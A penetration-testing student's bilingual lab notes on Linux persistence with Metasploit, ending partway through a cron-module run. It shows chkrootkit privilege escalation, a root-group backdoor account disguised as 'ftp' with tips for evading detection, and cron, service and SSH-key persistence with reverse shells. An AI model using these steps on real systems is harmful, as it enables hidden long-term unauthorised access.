---
layout: post
title: "Establishing Persistence On Linux"
date: "2023-03-24"
author: "r3kind1e"
header-img: "img/post-bg-Penetration Testing Student.png"
catalog:    true
tags: 
    - Penetration Testing Student v2
    - Host & Network Penetration Testing
    - The Metasploit Framework (MSF)
---

# Establishing Persistence On Linux
Persistence consists of techniques that adversaries use to keep access to systems across restarts, changed credentials, and other interruptions that could cut off their access.

Gaining an initial foothold is not enough, you need to setup and maintain persistent access to your targets.

The persistence techniques we can utilize will depend on the target configuration.

We can utilize various post exploitation persistence modules to ensure that we always have access to the target system.

# 在 Linux 上建立持久性
持久性包括对手用来在重启、更改凭据和其他可能切断其访问的中断期间保持对系统的访问的技术。

获得初始立足点是不够的，您需要设置和维护对目标的持久访问。

我们可以使用的持久性技术将取决于目标配置。

我们可以利用各种后期利用持久性模块来确保我们始终可以访问目标系统。

# Demo: Establishing Persistence On Linux（演示：在 Linux 上建立持久性）
We'll be gaining access via the SSH credentials. We'll then elevate our privileges via the chkrootkit vulnerability, after which we can take a look at how to establish persistence on that system so that we can have access to it whenever we want to.

```
ifconfig
192.182.80.2
```

Target IP Adress: 192.182.80.3

```
service postgresql start && msfconsole
workspace -a Linux_persistence
setg RHOSTS 192.182.80.3
search ssh_login
use auxiliary/scanner/ssh/ssh_login
set USERNAME jackie
set PASSWORD password
exploit
```

That is going to open up a command shell for us. 

```
sessions
sessions -u 1
sessions
```

We get a meterpreter session. And the privileges that we obtained are still going to be the user jackie. So we need to elevate our privileges.

We have explored the process of elevating our privileges, and that is via the chkrootkit utility. And what we're going to be doing is exploiting a vulnerability within chkrootkit 0.49 or versions prior to 0.50.

```
search chkrootkit
use exploit/unix/local/chkrootkit
show options
set SESSION 2
set CHKROOTKIT /bin/chkrootkit
exploit
show options
set LHOST 192.182.80.2
exploit
```

It's going to wait for the cron job to execute which will consequently give us a command shell, which we can then upgrade to an meterpreter session.

We get the command session here.

```
ls
cat flag
```

Put this in the background. 

```
sessions
```

We want to upgrade session 3, which is privileged, or that we currently have access to as the root user.

```
sessions -u 3
```

That'll give us a meterpreter session with root privileges. 

We have two meterpreter sessions. One of them is utilizing the user jack ie, which is an unprivileged user. We then have the meterpreter session 4 here, which has access with the root user or has root privileges.

```
sessions 4
```

Get user id. We are currently the root user. And we determine that through the user id, which is set to 0.

```
meterpreter > getuid
Server username: no-user @ victim-1 (uid=0, gid=0, euid=0, egid=0)
meterpreter > shell
/bin/bash -i
root@victim-1:~# whoami
root
```

So in order to establish persistence or in order to utilize some of the persistence modules for Linux, you will require root privileges in most cases.

The first technique we are going to be exploring is a manual technique. And it is the process of creating a backdoor user that can provide us with access whenever we require it.

This will only work if the target server is running SSH or a remote access protocol that can provide us with access whenever we need access. Consequently, the protocol should also be able to provide us access, primarily through a username and password.

We currently have root privileges.

List out the current users on the system. 

```
root@victim-1:~# cat /etc/passwd
```

We have the user jakie. We also have the user root here. And the rest of them are service accounts.

When it comes down to creating a backdoor user, the first thing that you need to take in consideration is the fact that the user should be as clandestine as possible and should be blend in.

So what I would typically recommend is providing the user name or the account username as something as a name that is very difficult to identify. What you don't want to do is create a user or a backdoor user with the username set to hack or backdoor access or backdoor or anything like that. What I would recommend doing is creating a user account that sort of looks like a service account.

`-m`: Create a home directory.

And we'll just call this user ftp. We can make the account look like the ftp service account. And make sure that an account called ftp doesn't exist.

`-s`: Specify the shell as `/bin/bash`.

If you're trying to make it as clandestine as possible, then you probably want to set the terminal session or the actual terminal for that user account as `/usr/sbin/nologin`, because that's primarily how service accounts are configured.

We can also specify the home directory for this particular account. `-m /var/www/html`.

```
root@victim-1:~# useradd -m ftp -s /bin/bash
root@victim-1:~# passwd ftp
password123
password123
root@victim-1:~# cat /etc/passwd
```

The other thing that I would recommend doing is providing the ftp user account with administrative or root privileges.

List all the groups that the root user is a part of, you can see it's part of the root group.

```
root@victim-1:~# groups root
root
```

Add the ftp account into the root group, then it will inherit the permissions associated with the root group, which pretty much gives us a root access.

`-aG`: add group, and then we want to add to the root group.

```
root@victim-1:~# usermod -aG root ftp
root@victim-1:~# groups ftp
```

ftp is part of the root group.

What we can do now in this particular case is utilize this backdoor user to authenticate legitimately to the target system via SSH. Whenever we need to gain access to the target system. And we're going to have administrative privileges because we've just added the user account to the root group.

Modify the backdoor user's user id, to make it look like it just wasn't created, or that it just was created a few seconds or a few minutes ago or recently, because the accounts that have just been created will get a user id right over here. That reflects the fact that it was created the most recently.

`-u`: Specify the user id we want. A user id like 15.

And then specify the account name `ftp`.

```
root@victim-1:~# usermod -u 15 ftp
root@victim-1:~# cat /etc/passwd
```

It now has the user id of 15. And then, we can modify the group that it belongs to or the group id to reflect that.

The whole objective here is to make the user account look as clandertine as possible in order to avoid detection.

Let's take a loot at some of the persistence modules that we can use for Linux targets.

Terminate this channel. Put the meterpreter session in the background.

```
search platform:linux persistence
```

[Cron Persistence](https://www.rapid7.com/db/modules/exploit/linux/local/cron_persistence/)

Cron Persistence

This module will create a cron or crontab entry to execute a payload. The module includes the ability to automatically clean up those entries to prevent multiple executions. syslog will get a copy of the cron entry.

Cron 持久化

该模块将创建一个 cron 或 crontab 条目来执行有效负载。该模块包括自动清理这些条目以防止多次执行的能力。syslog 将获得 cron 条目的副本。

It allows you to set up a cron job that will continuously connect to your handler.

This is my second recommended module, primarily because cron jobs can easily be detected by administrators on the system. And if it looks suspicious, then they can get rid of that cron job. And it may indicate compromise. Or it may be an indicator of compromise. So you want to be very assured of what module you're using and the effects and artifacts that it'll leave on the target system.

```
use exploit/linux/local/cron_persistence
show options
```

And the default timing option is set to be executed every 60 seconds, or every one minute.

```
set SESSION 4
exploit
show options
```

The payload being used in this case is `cmd/unix/reverse_perl`.

List out our sessions. Make sure that there isn't a conflicting LPORT here.

```
set LPORT 4422
set LHOST 192.182.80.2
exploit
```

This is not a guaranteed in terms of Linux. On Windows, you have a better chance, or you have a greater chance of success. Because, Windows systems are fairly similar in regards to the persistence techniques that you can utilize. However, with Linux, you may not have access to the crontab file. You also want to be wary of the fact that this could be detected quite easily.

[Service Persistence](https://www.rapid7.com/db/modules/exploit/linux/local/service_persistence/)

Service Persistence

This module will create a service on the box, and mark it for auto-restart. We need enough access to write service files and potentially restart services Targets: System V: CentOS <= 5 Debian <= 6 Kali 2.0 Ubuntu <= 9.04 Upstart: CentOS 6 Fedora >= 9, < 15 Ubuntu >= 9.10, <= 14.10 systemd: CentOS 7 Debian >= 7, <=8 Fedora >= 15 Ubuntu >= 15.04 Note: System V won't restart the service if it dies, only an init change (reboot etc) will restart it.

服务持久化

该模块将在盒子上创建一个服务，并将其标记为自动重启。我们需要足够的访问权限来写入服务文件并可能重启服务目标：System V：CentOS <= 5 Debian <= 6 Kali 2.0 Ubuntu <= 9.04 Upstart：CentOS 6 Fedora >= 9，< 15 Ubuntu >= 9.10，<= 14.10 systemd: CentOS 7 Debian >= 7, <=8 Fedora >= 15 Ubuntu >= 15.04 注意：如果 System V 死机，它不会重启服务，只有 init 更改（重启等）才会重启它。

```
use exploit/linux/local/service_persistence
```

We can specify the SHELLPATH, which in this case, the SHELLPATH is probably under `/usr/local/bin`, or `/usr/bin`.

And we can use the Tab auto completion feature to specify the payloads that we can use in this case.

```
set SESSION 4
exploit
set payload cmd/unix/reverse_python
show options
set LHOST 192.182.80.2
set LPORT 4422
exploit
info
set target 3
exploit
set target 4
exploit
```

Let's take a look at the model or the technique that I recommend whenever it comes down to establishing persistence on a Linux system.

```
search platform:linux persistence
```

And the reason for that is fairly simple. Whenever we set up persistence, we also want to be as clandestine as possible in regards to being detected.

[SSH Key Persistence](https://www.rapid7.com/db/modules/post/linux/manage/sshkey_persistence/)

SSH Key Persistence

This module will add an SSH key to a specified user (or all), to allow remote login via SSH at any time.

SSH 密钥持久性

该模块将为指定用户（或所有用户）添加 SSH 密钥，以允许随时通过 SSH 进行远程登录。

The way this module works is it will set up a private and public SSH key pair and will add the public key into the home directories of all the user accounts on the system. And will then provide us with the private key. And we can utilize that private key to authenticate to any of the user accounts on the system without providing a password. So, we never want to change the passwords on the system in regards to the user account. So, we also have the ability to change the root user password. But that would be a very strong indicator of compromise.

```
use post/linux/manage/sshkey_persistence
show options
set CREATESSHFOLDER true
```
In some cases, the target system may not have the SSH folder already created.

```
set SESSION 4
info
```

This is very difficult to detect because the SSH public key that's been added to the home directory of the users is something that is not frequently accessed by the users on the system. And this doesn't leave any indicator of compromise in regards to the process tree or any other artifacts apart from the fact that a system administrator can view who is currently logged on. But if we log in as the root user, then we might be able to avoid detection. 

```
show options
exploit
```

Because we specified the module to create the SSH directory or folder for all users as well as add the public key to all the user account's home directory. It'll add the public key to the authorized keys file under the home directory under SSH and authorized keys. And it does for all user accounts as well as, in this case, the FTP user.

So we can identify. The private key here will be saved within the following directory.

```
[+] Storing new private key as /root/.msf4/loot/20211127225655_Linux_persistenc_192.182.80.3_id_rsa_891312.txt
```

Access the private key. This is a OpenSSH Private Key.

```
loot
cat /root/.msf4/loot/20211127225655_Linux_persistenc_192.182.80.3_id_rsa_891312.txt
```

And there's the private key here.

How can we utilize this to gain access to the target system? Well, we just need to copy it. And I'm going to terminate all my meterpreter sessions or all the sessions that I have active on the target.

```
exit -y
```

That will terminate everything. And we're back within the actual terminal. We're not working within MSF console.

```
vim ssh_key
```

And I will paste in the private key here.

And I'll then provide it with tha appropriate permissions for an SSH private key.

```
chmod 0400 ssh_key
```

And then we can authenticate to the target system via any user we want via SSH.

`-i`: Specify the key, the private key.

```
ssh -i ssh_key root@192.182.80.3
root@victim-1:~# ls
root@victim-1:~# exit
```

We are logged in as root. And we didn't have to provide the root password. So we're not changing the root password. We're just gaining access via SSH key authentication.

And now, we have access via a typical terminal or a typical Linux command shell. And we can go through the process of upgrading this if we wanted to. But for continuous or for persistent access on the target system, this is a fantastic technique, because we're not creating a service, we're not creating a cron job, etc. 

"Why we need to input password when we try log in as user ftp via SSH? I think it's because the private key we specified belongs to root instead of ftp."

Try and log in to the user ftp here.

```
ssh -i ssh_key ftp@192.182.80.3
```

# Establishing Persistence On Linux（在 Linux 上建立持久性）
## Overview（概述）
Goal

This lab covers the process of establishing persistence on Linux with Metasploit.

目标

本实验涵盖使用 Metasploit 在 Linux 上建立持久性的过程。

## 复现视频内容
```
root@attackdefense:~# ifconfig
eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.58.78.2  netmask 255.255.255.0  broadcast 192.58.78.255
        ether 02:42:c0:3a:4e:02  txqueuelen 0  (Ethernet)
```

Target IP Address: 192.58.78.3

```
root@attackdefense:~# service postgresql start && msfconsole -q
Starting PostgreSQL 12 database server: main.
msf5 > workspace -a Linux_persistence
[*] Added workspace: Linux_persistence
[*] Workspace: Linux_persistence
msf5 > setg RHOSTS 192.58.78.3
RHOSTS => 192.58.78.3
msf5 > db_nmap -sV 192.58.78.3
[*] Nmap: Starting Nmap 7.70 ( https://nmap.org ) at 2023-03-24 09:08 UTC
[*] Nmap: Nmap scan report for target-1 (192.58.78.3)
[*] Nmap: Host is up (0.000010s latency).
[*] Nmap: Not shown: 999 closed ports
[*] Nmap: PORT   STATE SERVICE VERSION
[*] Nmap: 22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
[*] Nmap: MAC Address: 02:42:C0:3A:4E:03 (Unknown)
[*] Nmap: Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
[*] Nmap: Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 0.49 seconds
msf5 > services
Services
========

host         port  proto  name  state  info
----         ----  -----  ----  -----  ----
192.58.78.3  22    tcp    ssh   open   OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 Ubuntu Linux; protocol 2.0
msf5 > search ssh_login

Matching Modules
================

   #  Name                                    Disclosure Date  Rank    Check  Description
   -  ----                                    ---------------  ----    -----  -----------
   0  auxiliary/scanner/ssh/ssh_login                          normal  No     SSH Login Check Scanner
   1  auxiliary/scanner/ssh/ssh_login_pubkey                   normal  No     SSH Public Key Login Scanner


msf5 > use auxiliary/scanner/ssh/ssh_login
msf5 auxiliary(scanner/ssh/ssh_login) > set USERNAME jackie
USERNAME => jackie
msf5 auxiliary(scanner/ssh/ssh_login) > set PASSWORD password
PASSWORD => password
msf5 auxiliary(scanner/ssh/ssh_login) > exploit

[+] 192.58.78.3:22 - Success: 'jackie:password' ''
[*] Command shell session 1 opened (192.58.78.2:41271 -> 192.58.78.3:22) at 2023-03-24 09:11:26 +0000
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

```
msf5 auxiliary(scanner/ssh/ssh_login) > sessions

Active sessions
===============

  Id  Name  Type           Information                           Connection
  --  ----  ----           -----------                           ----------
  1         shell unknown  SSH jackie:password (192.58.78.3:22)  192.58.78.2:41271 -> 192.58.78.3:22 (192.58.78.3)

msf5 auxiliary(scanner/ssh/ssh_login) > sessions -u 1
[*] Executing 'post/multi/manage/shell_to_meterpreter' on session(s): [1]

[!] SESSION may not be compatible with this module.
[*] Upgrading session ID: 1[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 192.58.78.2:4433 [*] Sending stage (980808 bytes) to 192.58.78.3
[*] Meterpreter session 2 opened (192.58.78.2:4433 -> 192.58.78.3:48022) at 2023-03-24 09:13:16 +0000
[*] Command stager progress: 100.00% (773/773 bytes)
msf5 auxiliary(scanner/ssh/ssh_login) > sessions

Active sessions
===============

  Id  Name  Type                   Information                                                                  Connection
  --  ----  ----                   -----------                                                                  ----------
  1         shell unknown          SSH jackie:password (192.58.78.3:22)                                         192.58.78.2:41271 -> 192.58.78.3:22 (192.58.
78.3)
  2         meterpreter x86/linux  no-user @ victim-1 (uid=1000, gid=1000, euid=1000, egid=1000) @ 192.58.78.3  192.58.78.2:4433 -> 192.58.78.3:48022 (192.5
8.78.3)
```

```
msf5 auxiliary(scanner/ssh/ssh_login) > sessions 2
[*] Starting interaction with 2...

meterpreter > sysinfo
Computer     : 192.58.78.3
OS           : Ubuntu 18.04 (Linux 5.4.0-125-generic)
Architecture : x64
BuildTuple   : i486-linux-musl
Meterpreter  : x86/linux
meterpreter > getuid
Server username: no-user @ victim-1 (uid=1000, gid=1000, euid=1000, egid=1000)
```

```
meterpreter > shell
Process 6616 created.
Channel 1 created.
/bin/bash -i
bash: cannot set terminal process group (4140): Inappropriate ioctl for device
bash: no job control in this shell
jackie@victim-1:~$ id
id
uid=1000(jackie) gid=1000(jackie) groups=1000(jackie)
jackie@victim-1:~$ whoami
whoami
jackie
jackie@victim-1:~$ ps aux
ps aux
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.0  0.0   4624   808 ?        Ss   09:01   0:00 /bin/sh -c /usr/local/bin/start.sh
root           7  0.0  0.0  55128 20360 ?        S    09:01   0:00 /usr/bin/python /usr/bin/supervisord -n
root          12  0.0  0.0  28352  2576 ?        Ss   09:01   0:00 /usr/sbin/cron
root          22  0.0  0.0  72292  3260 ?        Ss   09:01   0:00 /usr/sbin/sshd
root          30  0.0  0.0   9916  2804 ?        S    09:02   0:00 /bin/bash /bin/check-down
root        4128  0.0  0.0 101548  6964 ?        Ss   09:11   0:00 sshd: jackie [priv]
jackie      4139  0.0  0.0 103848  5432 ?        S    09:11   0:00 sshd: jackie@notty
jackie      4140  0.0  0.0  18372  3244 ?        Ss   09:11   0:00 -bash
jackie      4969  0.0  0.0   1148  1028 ?        S    09:13   0:00 /tmp/CuwaE
jackie      6616  0.0  0.0   4624   808 ?        S    09:17   0:00 /bin/sh
jackie      6617  0.0  0.0  18504  3316 ?        S    09:17   0:00 /bin/bash -i
root        7033  0.0  0.0   4528   820 ?        S    09:18   0:00 sleep 60
jackie      7034  0.0  0.0  34396  2884 ?        R    09:18   0:00 ps aux
jackie@victim-1:~$ cat /bin/check-down
cat /bin/check-down
#!/bin/bash
while :
do
        /usr/local/bin/chkrootkit/chkrootkit -x > /dev/null 2>&1
        sleep 60
done
jackie@victim-1:~$ chkrootkit -help
chkrootkit -help
Usage: /bin/chkrootkit [options] [test ...]
Options:
        -h                show this help and exit
        -V                show version information and exit
        -l                show available tests and exit
        -d                debug
        -q                quiet mode
        -x                expert mode
        -r dir            use dir as the root directory
        -p dir1:dir2:dirN path for the external commands used by chkrootkit
        -n                skip NFS mounted dirs
jackie@victim-1:~$ chkrootkit -V
chkrootkit -V
chkrootkit version 0.49
```

```
meterpreter > 
Background session 2? [y/N]  
msf5 auxiliary(scanner/ssh/ssh_login) > search chkrootkit

Matching Modules
================

   #  Name                           Disclosure Date  Rank    Check  Description
   -  ----                           ---------------  ----    -----  -----------
   0  exploit/unix/local/chkrootkit  2014-06-04       manual  Yes    Chkrootkit Local Privilege Escalation


msf5 auxiliary(scanner/ssh/ssh_login) > use exploit/unix/local/chkrootkit
msf5 exploit(unix/local/chkrootkit) > info

       Name: Chkrootkit Local Privilege Escalation
     Module: exploit/unix/local/chkrootkit
   Platform: Unix
       Arch: cmd
 Privileged: Yes
    License: Metasploit Framework License (BSD)
       Rank: Manual
  Disclosed: 2014-06-04

Provided by:
  Thomas Stangner
  Julien "jvoisin" Voisin

Available targets:
  Id  Name
  --  ----
  0   Automatic

Check supported:
  Yes

Basic options:
  Name        Current Setting       Required  Description
  ----        ---------------       --------  -----------
  CHKROOTKIT  /usr/sbin/chkrootkit  yes       Path to chkrootkit
  SESSION                           yes       The session to run this module on.

Payload information:

Description:
  Chkrootkit before 0.50 will run any executable file named 
  /tmp/update as root, allowing a trivial privilege escalation. 
  WfsDelay is set to 24h, since this is how often a chkrootkit scan is 
  scheduled by default.
```

```
msf5 exploit(unix/local/chkrootkit) > set CHKROOTKIT /bin/chkrootkit
CHKROOTKIT => /bin/chkrootkit
msf5 exploit(unix/local/chkrootkit) > set SESSION 2
SESSION => 2
msf5 exploit(unix/local/chkrootkit) > exploit

[*] Started reverse TCP double handler on 10.1.0.13:4444 
[!] Rooting depends on the crontab (this could take a while)
[*] Payload written to /tmp/update
[*] Waiting for chkrootkit to run via cron...
^C[*] Exploit completed, but no session was created.
msf5 exploit(unix/local/chkrootkit) > show options

Module options (exploit/unix/local/chkrootkit):

   Name        Current Setting  Required  Description
   ----        ---------------  --------  -----------
   CHKROOTKIT  /bin/chkrootkit  yes       Path to chkrootkit
   SESSION     2                yes       The session to run this module on.


Payload options (cmd/unix/reverse):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.1.0.13        yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf5 exploit(unix/local/chkrootkit) > set LHOST 192.58.78.2
LHOST => 192.58.78.2
msf5 exploit(unix/local/chkrootkit) > exploit

[*] Started reverse TCP double handler on 192.58.78.2:4444 
[!] Rooting depends on the crontab (this could take a while)
[*] Payload written to /tmp/update
[*] Waiting for chkrootkit to run via cron...
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo nfxYYsLNVAcqbthx;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket A
[*] A: "nfxYYsLNVAcqbthx\r\n"
[*] Matching...
[*] B is input...
[*] Command shell session 3 opened (192.58.78.2:4444 -> 192.58.78.3:60226) at 2023-03-24 09:27:17 +0000
[+] Deleted /tmp/update


ls
flag
cat flag
9db8bf8f483ff50857f26f9bd636bed6
whoami
root
id
uid=0(root) gid=0(root) groups=0(root)
^Z
Background session 3? [y/N]  y
```

```
msf5 exploit(unix/local/chkrootkit) > sessions

Active sessions
===============

  Id  Name  Type                   Information                                                                  Connection
  --  ----  ----                   -----------                                                                  ----------
  1         shell unknown          SSH jackie:password (192.58.78.3:22)                                         192.58.78.2:41271 -> 192.58.78.3:22 (192.58.
78.3)
  2         meterpreter x86/linux  no-user @ victim-1 (uid=1000, gid=1000, euid=1000, egid=1000) @ 192.58.78.3  192.58.78.2:4433 -> 192.58.78.3:48022 (192.5
8.78.3)
  3         shell cmd/unix                                                                                      192.58.78.2:4444 -> 192.58.78.3:60226 (192.5
8.78.3)

msf5 exploit(unix/local/chkrootkit) > sessions -u 3
[*] Executing 'post/multi/manage/shell_to_meterpreter' on session(s): [3]

[*] Upgrading session ID: 3
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 192.58.78.2:4433 
[*] Sending stage (980808 bytes) to 192.58.78.3
[*] Meterpreter session 4 opened (192.58.78.2:4433 -> 192.58.78.3:56510) at 2023-03-24 09:29:53 +0000
[*] Command stager progress: 100.00% (773/773 bytes)
msf5 exploit(unix/local/chkrootkit) > sessions

Active sessions
===============

  Id  Name  Type                   Information                                                                  Connection
  --  ----  ----                   -----------                                                                  ----------
  1         shell unknown          SSH jackie:password (192.58.78.3:22)                                         192.58.78.2:41271 -> 192.58.78.3:22 (192.58.
78.3)
  2         meterpreter x86/linux  no-user @ victim-1 (uid=1000, gid=1000, euid=1000, egid=1000) @ 192.58.78.3  192.58.78.2:4433 -> 192.58.78.3:48022 (192.58.78.3)
  3         shell cmd/unix                                                                                      192.58.78.2:4444 -> 192.58.78.3:60226 (192.58.78.3)
  4         meterpreter x86/linux  no-user @ victim-1 (uid=0, gid=0, euid=0, egid=0) @ 192.58.78.3              192.58.78.2:4433 -> 192.58.78.3:56510 (192.58.78.3)
```

```
msf5 exploit(unix/local/chkrootkit) > sessions 4
[*] Starting interaction with 4...

meterpreter > sysinfo
Computer     : 192.58.78.3
OS           : Ubuntu 18.04 (Linux 5.4.0-125-generic)
Architecture : x64
BuildTuple   : i486-linux-musl
Meterpreter  : x86/linux
meterpreter > getuid
Server username: no-user @ victim-1 (uid=0, gid=0, euid=0, egid=0)
meterpreter > shell
Process 13625 created.
Channel 1 created.
/bin/bash -i
bash: cannot set terminal process group (26): Inappropriate ioctl for device
bash: no job control in this shell
root@victim-1:~# id
id
uid=0(root) gid=0(root) groups=0(root)
root@victim-1:~# whoami
whoami
root
```

```
root@victim-1:~# cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
messagebus:x:103:105::/nonexistent:/usr/sbin/nologin
sshd:x:104:65534::/run/sshd:/usr/sbin/nologin
jackie:x:1000:1000:,,,:/home/jackie:/bin/bash

```

```
root@victim-1:~# useradd -m ftp -s /bin/bash
useradd -m ftp -s /bin/bash
root@victim-1:~# passwd ftp
passwd ftp
Enter new UNIX password: password123
Retype new UNIX password: password123
passwd: password updated successfully
root@victim-1:~# cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
messagebus:x:103:105::/nonexistent:/usr/sbin/nologin
sshd:x:104:65534::/run/sshd:/usr/sbin/nologin
jackie:x:1000:1000:,,,:/home/jackie:/bin/bash
ftp:x:1001:1001::/home/ftp:/bin/bash
```

```
root@victim-1:~# groups root
groups root
root : root
root@victim-1:~# usermod -aG root ftp
usermod -aG root ftp
root@victim-1:~# groups ftp
groups ftp
ftp : ftp root
root@victim-1:~# usermod -u 15 ftp
usermod -u 15 ftp
```

```
root@victim-1:~# cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
messagebus:x:103:105::/nonexistent:/usr/sbin/nologin
sshd:x:104:65534::/run/sshd:/usr/sbin/nologin
jackie:x:1000:1000:,,,:/home/jackie:/bin/bash
ftp:x:15:1001::/home/ftp:/bin/bash
root@victim-1:~# ^C
Terminate channel 1? [y/N]  y
meterpreter > 
Background session 4? [y/N]
```

```
msf5 exploit(unix/local/chkrootkit) > search platform:linux persistence

Matching Modules
================

   #  Name                                                 Disclosure Date  Rank       Check  Description
   -  ----                                                 ---------------  ----       -----  -----------
   0  exploit/linux/local/apt_package_manager_persistence  1999-03-09       excellent  No     APT Package Manager Persistence
   1  exploit/linux/local/autostart_persistence            2006-02-13       excellent  No     Autostart Desktop Item Persistence
   2  exploit/linux/local/bash_profile_persistence         1989-06-08       normal     No     Bash Profile Persistence
   3  exploit/linux/local/cron_persistence                 1979-07-01       excellent  No     Cron Persistence
   4  exploit/linux/local/rc_local_persistence             1980-10-01       excellent  No     rc.local Persistence
   5  exploit/linux/local/service_persistence              1983-01-01       excellent  No     Service Persistence
   6  exploit/linux/local/yum_package_manager_persistence  2003-12-17       excellent  No     Yum Package Manager Persistence
   7  post/linux/manage/sshkey_persistence                                  excellent  No     SSH Key Persistence
```

```
msf5 exploit(unix/local/chkrootkit) > use exploit/linux/local/cron_persistence
msf5 exploit(linux/local/cron_persistence) > show options

Module options (exploit/linux/local/cron_persistence):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   CLEANUP   true             yes       delete cron entry after execution
   SESSION                    yes       The session to run this module on.
   TIMING    * * * * *        no        cron timing.  Changing will require WfsDelay to be adjusted
   USERNAME  root             no        User to run cron/crontab as


Exploit target:

   Id  Name
   --  ----
   1   User Crontab


msf5 exploit(linux/local/cron_persistence) > set SESSION 4
SESSION => 4
msf5 exploit(linux/local/cron_persistence) > exploit

[!] SESSION may not be compatible with this module.
[*] Started reverse TCP handler on 10.1.0.13:4444 
[-] Failed to open file: /etc/cron.allow: core_channel_open: Operation failed: 1
[-] Failed to open file: /etc/cron.deny: core_channel_open: Operation failed: 1
[-] Failed to open file: /etc/cron.d/cron.allow: core_channel_open: Operation failed: 1
[-] Failed to open file: /etc/cron.d/cron.deny: core_channel_open: Operation failed: 1
[*] Waiting 90sec for execution
^C[-] Exploit failed [user-interrupt]: Interrupt 
[-] exploit: Interrupted
msf5 exploit(linux/local/cron_persistence) > show options

Module options (exploit/linux/local/cron_persistence):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   CLEANUP   true             yes       delete cron entry after execution
   SESSION   4                yes       The session to run this module on.
